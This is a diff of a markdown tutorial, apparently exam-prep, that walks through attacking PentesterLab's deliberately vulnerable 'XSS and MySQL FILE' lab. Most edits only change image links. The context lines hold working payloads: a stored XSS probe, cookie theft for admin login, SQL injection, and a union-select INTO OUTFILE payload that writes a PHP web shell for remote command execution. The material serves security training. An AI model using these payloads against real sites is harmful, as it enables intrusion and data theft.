@@ -1,4 +1,4 @@
-# Task - 1 
+# AWAE/OSWE PREP (Code analysis and gaining rce with automating everything with Python)
 
 Hey guys welcome to my article about source-code analysis and finding vulnerabilites on a PHP website and for the test we will be using [this](https://pentesterlab.com/exercises/xss_and_mysql_file/course), it's a basic web-app vulnerable program for learning the web-app but we will analyse the source code and automate the exploitation with python. [Link](https://pentesterlab.com/exercises/xss_and_mysql_file/iso) for iso. Kudos to [Wetw0rk](https://github.com/wetw0rk/AWAE-PREP/tree/master/XSS%20and%20MySQL).
 
@@ -130,7 +130,7 @@ Code:-$post = Post::find(intval($_GET['id']));
 ```
 Anything which is being passed to ```id``` parameter will be converted to integer and even if we go ahead and try to insert a string or anything let's see what happens..
 
-<<selection 007>>
+![](Selection_007.png)
 <br/>
 
 See that error now we know why it's happening so let's move forward ...
@@ -138,7 +138,7 @@ See that error now we know why it's happening so let's move forward ...
 We shall see which file is handling those comments and to see that i will intercept with burp ...
 
 <br/>
-<<selection 008>>
+![](Selection_008.png)
 <br/>
 File which is handling the comments is ```post_comment.php``` So let's analyse it...
 
@@ -234,7 +234,7 @@ mysql> select * from comments;
 ```
 We can see the data being stored so let's try to insert some javascript values ```<script>document.cookie</script>```
 <br/>
-<<selection 009>>
+![](Selection_009.png)
 <br/>
 
 **OUTPUT**
@@ -313,7 +313,7 @@ That the value of ```text``` field is being printed without any filtering so thi
 So, Let's Try to insert a basic xss popup payload...
 
 <br/>
-<<selection 010>>
+![](Selection_010.png)
 <br/>
 
 So we can do stored xss let's automate this with python and grab cookies :)
@@ -377,7 +377,7 @@ In this function i have done some horrible regex to filter out the cookie and re
 But for now we will just login by intercepting the request by burpsuite and changing the cookies...
 
 <br/>
-<<selection 011>>
+![](Selection_011.png)
 <br />
 
 Now that we have logged in as admin and we are at ```http://192.168.0.5/admin/index.php``` page so let's look into the source code of pages inside the ```admin``` directory one by one...
@@ -432,7 +432,7 @@ function find($id) {
 Aha! here we can see that the user input(id) variable is being directly passed without any checks or validiation so there has to be a sql injection on this...Let's try :)
 
 <br/>
-<<selection 012>>
+![](Selection_012.png)
 <br/>
 
 ```
@@ -472,7 +472,7 @@ So first we shall construct our basic payload to write a file in css directory..
 Code:-union select 1,"hello sarthak",3,4 into outfile "/var/www/css/lol.php"%23
 ```
 <br/>
-<<selection 013>>
+![](Selection_013.png)
 <br/>
 
 **OUTPUT**
@@ -494,7 +494,7 @@ PAYLOAD:-union select "<?php","system($_GET['c']);","?>",";" into outfile "/var/
 This would do our work hehe :)
 
 <br/>
-<<selection 014>>
+![](Selection_014.png)
 <br/>
 
 
@@ -510,8 +510,8 @@ root@debian:/var/www/css#
 ```
 
 ### RCE achieved 
-
-<<selection 015>>
+<br/>
+![](Selection_015.png)
 <br/>
 
 And yes finally we got rce so let's try to update our script and automate everything upto shell...
@@ -567,7 +567,7 @@ def shell_upload(r,head):
 
 Here we just uploaded the shell as we did in browser but with requests and all the headers so after sending everything we checked by opening the shell without ```c``` parameter which always gives output which had ```Notice: Undefined index:``` in it 
 </br/>
-<<selection 016>>
+![](Selection_016.png)
 <br/>
 
 After that ```shell_interact``` function is invoked 
@@ -773,4 +773,7 @@ setTimeout(function() {
 So this is how admin would be impersonated
 
 ## Demo
-<<demo-gif.gif>>
+<br/>
+![](demo.gif)
+<br/>
+I hope you guys would like this article ... i will post more as soon as i get more time :)
